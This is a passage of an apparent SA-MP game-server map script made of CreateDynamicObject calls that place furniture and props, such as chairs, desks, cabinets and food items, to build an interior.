	CreateDynamicObject(1800, 1583.50000, -1689.09998, 1089.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1806, 1570.98987, -1674.81006, 1100.08765,   0.00000, 0.00000, 50.00000);
	CreateDynamicObject(1806, 1571.09644, -1676.76233, 1100.08765,   0.00000, 0.00000, 70.00000);
	CreateDynamicObject(1806, 1572.34424, -1672.43469, 1100.08765,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(1806, 1572.46826, -1678.41711, 1100.08765,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(1806, 1573.80005, -1690.35657, 1100.08667,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(1806, 1573.80005, -1692.44739, 1100.08667,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1806, 1573.80005, -1694.32617, 1100.08667,   0.00000, 0.00000, 130.00000);
	CreateDynamicObject(1806, 1576.36206, -1692.19995, 1100.08667,   0.00000, 0.00000, 200.00000);
	CreateDynamicObject(1806, 1573.80005, -1696.20947, 1100.08667,   0.00000, 0.00000, 100.00000);
	CreateDynamicObject(1806, 1577.89368, -1692.19995, 1100.08667,   0.00000, 0.00000, -200.00000);
	CreateDynamicObject(1806, 1573.80005, -1698.29517, 1100.08667,   0.00000, 0.00000, 60.00000);
	CreateDynamicObject(1806, 1576.36206, -1696.44995, 1100.08667,   0.00000, 0.00000, -20.00000);
	CreateDynamicObject(1806, 1580.28198, -1692.19995, 1100.08667,   0.00000, 0.00000, 200.00000);
	CreateDynamicObject(1806, 1575.93140, -1697.76770, 1100.08667,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1806, 1585.60767, -1668.96472, 1100.08765,   0.00000, 0.00000, 110.00000);
	CreateDynamicObject(1806, 1577.89368, -1696.44995, 1100.08667,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(1806, 1582.04980, -1692.19995, 1100.08667,   0.00000, 0.00000, -200.00000);
	CreateDynamicObject(1806, 1577.60193, -1697.76770, 1100.08667,   0.00000, 0.00000, 200.00000);
	CreateDynamicObject(1806, 1580.28198, -1696.44995, 1100.08667,   0.00000, 0.00000, -20.00000);
	CreateDynamicObject(1806, 1579.59998, -1697.76770, 1100.08667,   0.00000, 0.00000, 220.00000);
	CreateDynamicObject(1806, 1585.01453, -1690.45398, 1100.08667,   0.00000, 0.00000, -80.00000);
	CreateDynamicObject(1806, 1588.39990, -1681.50928, 1100.08740,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(1806, 1582.04980, -1696.44995, 1100.08667,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(1806, 1585.01453, -1692.58289, 1100.08667,   0.00000, 0.00000, -100.00000);
	CreateDynamicObject(1806, 1581.69592, -1697.76770, 1100.08667,   0.00000, 0.00000, 200.00000);
	CreateDynamicObject(1806, 1588.76050, -1686.69287, 1100.08740,   0.00000, 0.00000, 70.00000);
	CreateDynamicObject(1806, 1585.01453, -1694.42542, 1100.08667,   0.00000, 0.00000, -70.00000);
	CreateDynamicObject(1806, 1583.43494, -1697.76770, 1100.08667,   0.00000, 0.00000, 190.00000);
	CreateDynamicObject(1806, 1585.01453, -1696.56604, 1100.08667,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(1806, 1585.58386, -1697.76770, 1100.08667,   0.00000, 0.00000, 150.00000);
	CreateDynamicObject(1808, 1556.27002, -1657.50000, 1100.08679,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1810, 1588.95520, -1665.40405, 1089.57996,   0.00000, 0.00000, -40.00000);
	CreateDynamicObject(1811, 1573.50000, -1657.81885, 1101.09998,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1811, 1583.17688, -1681.51770, 1100.69995,   0.00000, 0.00000, 70.00000);
	CreateDynamicObject(1811, 1583.17688, -1685.59998, 1100.69995,   0.00000, 0.00000, -70.00000);
	CreateDynamicObject(1811, 1586.14612, -1685.01624, 1100.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1823, 1558.80005, -1671.69995, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1823, 1558.80005, -1680.50000, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1985, 1554.00000, -1707.00000, 1103.59998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1998, 1587.34998, -1681.21997, 1100.08691,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1999, 1589.08997, -1666.30005, 1089.58862,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2008, 1571.92456, -1671.44995, 1100.08679,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2008, 1573.00000, -1679.65002, 1100.08679,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2050, 1572.25000, -1657.90002, 1102.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2055, 1572.23499, -1659.00000, 1103.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2066, 1574.48499, -1698.88000, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2066, 1589.12000, -1680.22998, 1100.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2081, 1603.50000, -1703.80005, 1107.09839,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(2081, 1604.30005, -1711.15002, 1107.09839,   0.00000, 0.00000, -145.00000);
	CreateDynamicObject(2089, 1574.26001, -1689.33496, 1107.09656,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2089, 1588.66504, -1688.50000, 1107.09656,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2127, 1569.64001, -1652.16431, 1100.08813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2161, 1579.17004, -1666.46179, 1102.90002,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(2161, 1593.30505, -1695.19995, 1109.94995,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(2161, 1593.30505, -1700.65002, 1109.94995,   0.00000, 180.00000, 90.00000);
	CreateDynamicObject(2161, 1596.30005, -1703.12000, 1109.94995,   0.00000, 180.00000, 0.00000);
	CreateDynamicObject(2163, 1556.82495, -1686.94604, 1101.97498,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2163, 1559.05005, -1686.94604, 1101.97498,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2163, 1561.27502, -1686.94604, 1101.97498,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2163, 1567.68005, -1686.94604, 1101.97498,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2163, 1569.89001, -1686.94604, 1101.97498,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2163, 1571.97998, -1688.23999, 1101.97498,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2163, 1571.97998, -1690.47998, 1101.97498,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2163, 1571.97998, -1692.69995, 1101.97498,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2163, 1559.57996, -1699.26001, 1101.97498,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1561.80005, -1699.26001, 1101.97498,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1571.97998, -1694.93005, 1101.97498,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2163, 1564.03003, -1699.26001, 1101.97498,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1566.25000, -1699.26001, 1101.97498,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1571.97998, -1697.15186, 1101.97498,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2163, 1568.48999, -1699.26001, 1101.97498,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2163, 1570.71301, -1699.26001, 1101.97498,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2164, 1583.62695, -1664.37500, 1100.08752,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2164, 1585.40002, -1664.37500, 1100.08752,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2164, 1574.05005, -1707.45203, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2164, 1575.79651, -1708.40002, 1107.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2164, 1593.31995, -1686.00000, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2164, 1593.31995, -1691.69995, 1107.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2164, 1595.00000, -1693.50000, 1107.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2164, 1588.87000, -1706.65405, 1107.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2164, 1587.92200, -1708.40002, 1107.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2164, 1595.80005, -1702.89001, 1107.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2165, 1569.77002, -1675.00000, 1100.08740,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2165, 1569.77002, -1677.00000, 1100.08740,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2165, 1584.31494, -1670.23096, 1100.08777,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2166, 1569.75000, -1672.40002, 1100.08765,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2166, 1570.77502, -1679.69995, 1100.08765,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2166, 1584.29504, -1668.27502, 1100.08813,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2166, 1586.19995, -1669.21997, 1100.08813,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2167, 1593.89502, -1708.38000, 1107.09875,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2167, 1593.89502, -1708.38000, 1108.61499,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2169, 1574.90002, -1657.30005, 1100.44995,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2171, 1587.59998, -1666.34497, 1088.27698,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2172, 1572.67505, -1691.00500, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2172, 1572.67505, -1692.98596, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2172, 1572.67505, -1694.96594, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2172, 1572.67505, -1696.94604, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2172, 1576.28503, -1698.92505, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2172, 1578.26599, -1698.92505, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2172, 1586.18506, -1690.01001, 1100.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2172, 1580.24695, -1698.92505, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2172, 1586.18506, -1691.98999, 1100.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2172, 1582.22705, -1698.92505, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2172, 1586.18506, -1693.96997, 1100.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2172, 1586.18506, -1695.94995, 1100.07996,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2172, 1584.20703, -1698.92505, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2173, 1603.00000, -1689.40002, 1107.09705,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2173, 1603.00000, -1698.80005, 1107.09705,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2183, 1575.70898, -1695.00000, 1100.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2183, 1579.65002, -1695.00000, 1100.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2184, 1602.00000, -1706.69995, 1107.09729,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2190, 1576.59998, -1694.34998, 1100.88000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2190, 1577.26526, -1694.02002, 1100.88000,   0.00000, 0.00000, 140.00000);
	CreateDynamicObject(2190, 1577.09998, -1694.69995, 1100.88000,   0.00000, 0.00000, -40.00000);
	CreateDynamicObject(2190, 1577.80005, -1694.34998, 1100.88000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2190, 1580.55005, -1694.34998, 1100.88000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2190, 1581.19995, -1694.02002, 1100.88000,   0.00000, 0.00000, 140.00000);
	CreateDynamicObject(2190, 1581.07104, -1694.69995, 1100.88000,   0.00000, 0.00000, -40.00000);
	CreateDynamicObject(2190, 1581.75500, -1694.34998, 1100.88000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2190, 1602.50000, -1689.34998, 1107.89001,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2191, 1576.71997, -1690.01001, 1100.08655,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2193, 1573.69995, -1698.92505, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2193, 1586.18506, -1697.91003, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2195, 1604.19995, -1684.50000, 1107.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2195, 1604.19995, -1692.69995, 1107.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2195, 1604.09998, -1694.23499, 1107.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2195, 1604.09998, -1702.17505, 1107.69995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1556.59998, -1687.06995, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1558.82800, -1687.06995, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1561.05505, -1687.06995, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1570.50000, -1680.53003, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1567.44104, -1687.06995, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1570.50000, -1667.87000, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1571.76001, -1670.56995, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1572.72803, -1680.53003, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1571.76001, -1683.22998, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1569.67102, -1687.06995, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1572.72803, -1667.87000, 1100.08643,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2200, 1573.98901, -1670.56995, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1573.98901, -1683.22998, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1571.88000, -1688.01697, 1100.08643,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2200, 1571.88000, -1690.24597, 1100.08643,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2200, 1571.88000, -1692.47498, 1100.08643,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2200, 1559.79004, -1699.13599, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1562.01794, -1699.13599, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1571.88000, -1694.70398, 1100.08643,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2200, 1564.24500, -1699.13599, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1566.47302, -1699.13599, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1571.88000, -1696.93005, 1100.08643,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2200, 1568.70105, -1699.13599, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2200, 1570.93005, -1699.13599, 1100.08643,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2202, 1573.94995, -1671.42505, 1100.08789,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2202, 1574.84998, -1679.68005, 1100.08789,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2202, 1581.00000, -1664.81995, 1100.08789,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2207, 1582.44995, -1690.44995, 1107.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2207, 1580.59998, -1706.00000, 1107.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2208, 1580.60999, -1694.00000, 1106.99500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1582.50000, -1694.00000, 1106.99500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1580.60999, -1696.75000, 1106.99597,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1582.50000, -1696.75000, 1106.99597,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1580.60999, -1699.55005, 1106.99500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1582.50000, -1699.55005, 1106.99500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1580.60999, -1702.30005, 1106.99597,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1582.50000, -1702.30005, 1106.99597,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1580.60999, -1705.05005, 1106.99500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2208, 1582.50000, -1705.05005, 1106.99500,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2214, 1557.92261, -1662.74939, 1100.94800,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2214, 1557.89661, -1660.46472, 1100.94800,   -25.30000, 23.35000, 0.00000);
	CreateDynamicObject(2214, 1563.80115, -1658.37219, 1101.36499,   -25.30000, 23.35000, 0.00000);
	CreateDynamicObject(2214, 1563.20410, -1657.87561, 1101.36499,   -25.30000, 23.35000, 180.00000);
	CreateDynamicObject(2214, 1570.37256, -1660.63257, 1100.94800,   -25.30000, 23.35000, 0.00000);
	CreateDynamicObject(2214, 1562.60449, -1655.16724, 1101.19995,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2214, 1564.33447, -1655.12341, 1101.19995,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2214, 1567.69946, -1655.12756, 1100.90002,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2214, 1569.40723, -1655.13892, 1101.19995,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2214, 1570.09436, -1655.16296, 1100.90002,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2219, 1557.55981, -1660.84143, 1100.94495,   -25.30000, 23.35000, 0.00000);
	CreateDynamicObject(2219, 1569.95081, -1662.70264, 1100.94495,   -25.30000, 23.35000, -90.00000);
	CreateDynamicObject(2219, 1570.10120, -1659.52002, 1100.94495,   -25.30000, 23.35000, 0.00000);
	CreateDynamicObject(2219, 1563.03479, -1655.14734, 1100.90002,   -25.10000, 23.40000, 70.00000);
	CreateDynamicObject(2219, 1564.95630, -1655.00989, 1101.19995,   -25.10000, 23.40000, -100.00000);
	CreateDynamicObject(2219, 1566.15137, -1655.04272, 1101.19995,   -25.10000, 23.40000, -100.00000);
	CreateDynamicObject(2219, 1567.27563, -1655.02393, 1101.19995,   -25.10000, 23.40000, -100.00000);
	CreateDynamicObject(2219, 1560.88000, -1652.57849, 1101.08496,   -25.10000, 23.40000, 70.00000);
	CreateDynamicObject(2221, 1575.92188, -1694.82471, 1100.95703,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(2221, 1589.30005, -1666.32446, 1090.46997,   0.00000, 0.00000, 160.00000);
	CreateDynamicObject(2222, 1569.65161, -1678.89661, 1100.93994,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2223, 1579.25696, -1693.96448, 1100.94995,   0.00000, 0.00000, -100.00000);
	CreateDynamicObject(2245, 1604.25000, -1703.80005, 1107.88000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2245, 1604.13623, -1711.83435, 1107.88000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2253, 1576.94995, -1689.84998, 1102.17004,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2266, 1604.37000, -1698.30005, 1109.28796,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2270, 1593.77002, -1706.65002, 1109.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2289, 1604.83496, -1688.84998, 1109.50000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2297, 1598.50000, -1703.40002, 1107.08997,   0.00000, 0.00000, -45.00000);
	CreateDynamicObject(2297, 1599.50000, -1702.63000, 1107.08997,   0.00000, 0.00000, 135.00000);
	CreateDynamicObject(2311, 1598.05005, -1695.80005, 1107.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2344, 1599.55066, -1695.48242, 1107.58997,   0.00000, 0.00000, 40.00000);
	CreateDynamicObject(2344, 1603.19995, -1689.44995, 1107.90002,   0.00000, 0.00000, -50.00000);
	CreateDynamicObject(2344, 1599.03809, -1711.90234, 1107.93701,   0.00000, 0.00000, 150.00000);
	CreateDynamicObject(2354, 1557.98279, -1659.16748, 1100.94995,   -25.30000, 23.35000, 80.00000);
	CreateDynamicObject(2354, 1570.65515, -1661.58813, 1100.94995,   -25.30000, 23.35000, 80.00000);
	CreateDynamicObject(2354, 1559.92834, -1655.08423, 1100.96497,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2354, 1568.22986, -1658.14148, 1101.36499,   -25.30000, 23.35000, 80.00000);
	CreateDynamicObject(2354, 1562.03699, -1655.14209, 1100.90002,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2354, 1566.83069, -1655.12256, 1100.90002,   -25.30000, 23.35000, 70.00000);
	CreateDynamicObject(2369, 1558.01660, -1654.76733, 1100.91394,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2397, 1556.40601, -1698.84827, 1100.81006,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2397, 1557.47998, -1698.84827, 1100.81006,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2415, 1558.37000, -1652.31494, 1100.08716,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2415, 1566.84998, -1652.31494, 1100.08716,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2416, 1556.65002, -1654.21497, 1100.07996,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2416, 1562.06006, -1652.31494, 1100.07996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2417, 1559.20996, -1652.06006, 1100.08521,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2417, 1565.84998, -1652.06006, 1100.08521,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2419, 1560.17004, -1652.31494, 1100.08691,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2419, 1563.94995, -1652.31494, 1100.08691,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2420, 1561.30005, -1664.13000, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2420, 1566.44995, -1664.13000, 1100.07996,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2426, 1560.80005, -1651.90002, 1101.03699,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2427, 1564.69995, -1651.80005, 1101.03809,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2446, 1556.67004, -1654.91846, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2446, 1557.67004, -1654.91846, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2446, 1558.67004, -1654.91846, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2446, 1559.67004, -1654.91846, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2446, 1560.67004, -1654.91846, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2449, 1561.67004, -1654.94995, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2449, 1563.92004, -1654.94495, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2449, 1566.30603, -1654.94995, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2449, 1568.55603, -1654.94495, 1099.87000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2451, 1556.46997, -1652.31494, 1100.08777,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2451, 1567.69995, -1652.31494, 1100.08777,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2453, 1560.87402, -1655.06995, 1101.22998,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2518, 1555.50000, -1693.33496, 1100.40002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2518, 1553.69995, -1693.33496, 1100.40002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2518, 1551.90002, -1693.33496, 1100.40002,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2518, 1580.45996, -1676.19995, 1089.84998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2518, 1580.45996, -1672.50000, 1089.84998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2518, 1580.45996, -1679.90002, 1089.84998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2518, 1580.45996, -1683.59998, 1089.84998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2518, 1580.45996, -1687.19995, 1089.84998,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2525, 1555.14001, -1687.48999, 1100.09851,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 1553.43994, -1687.48999, 1100.09851,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 1551.73999, -1687.48999, 1100.09851,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 1582.40002, -1675.65002, 1089.57996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 1582.40002, -1671.96997, 1089.57996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 1582.40002, -1679.32996, 1089.57996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 1582.40002, -1683.00000, 1089.57996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2525, 1582.40002, -1686.67004, 1089.57996,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2596, 1599.40002, -1683.93005, 1109.75000,   0.00000, 0.00000, 30.00000);
	CreateDynamicObject(2597, 1556.91431, -1698.88196, 1100.90002,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2606, 1569.06006, -1675.56006, 1101.12000,   90.00000, 0.00000, -90.00000);
	CreateDynamicObject(2606, 1569.06006, -1673.57996, 1101.12000,   90.00000, 0.00000, -90.00000);
	CreateDynamicObject(2606, 1569.06006, -1677.53503, 1101.12000,   90.00000, 0.00000, -90.00000);
	CreateDynamicObject(2606, 1569.28003, -1675.56006, 1102.92749,   20.00000, 0.00000, 90.00000);
	CreateDynamicObject(2606, 1569.06006, -1671.59998, 1101.12000,   90.00000, 0.00000, -90.00000);
	CreateDynamicObject(2606, 1569.06006, -1679.51501, 1101.12000,   90.00000, 0.00000, -90.00000);
	CreateDynamicObject(2608, 1569.30005, -1681.84998, 1101.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2608, 1569.30005, -1669.19995, 1101.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2608, 1569.30005, -1681.84998, 1102.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2608, 1569.30005, -1669.19995, 1102.50000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2611, 1575.29004, -1673.50000, 1101.93005,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2612, 1565.90002, -1687.00000, 1101.93005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2614, 1568.87500, -1681.80005, 1102.44995,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2614, 1568.87500, -1669.25000, 1102.44995,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2615, 1565.46997, -1667.75000, 1102.08997,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2615, 1565.91003, -1683.33997, 1102.08997,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2616, 1574.05005, -1688.69995, 1108.80005,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2616, 1588.87500, -1689.15002, 1108.80005,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2627, 1546.50000, -1704.80005, 1100.08667,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2628, 1546.50000, -1702.00000, 1100.08594,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2629, 1546.50000, -1699.00000, 1100.08606,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2630, 1546.50000, -1707.30005, 1100.08618,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2631, 1553.80005, -1700.00000, 1100.08716,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2631, 1553.80005, -1703.00000, 1100.08716,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2632, 1547.07056, -1695.61682, 1100.08801,   0.00000, 0.00000, 0.00000);
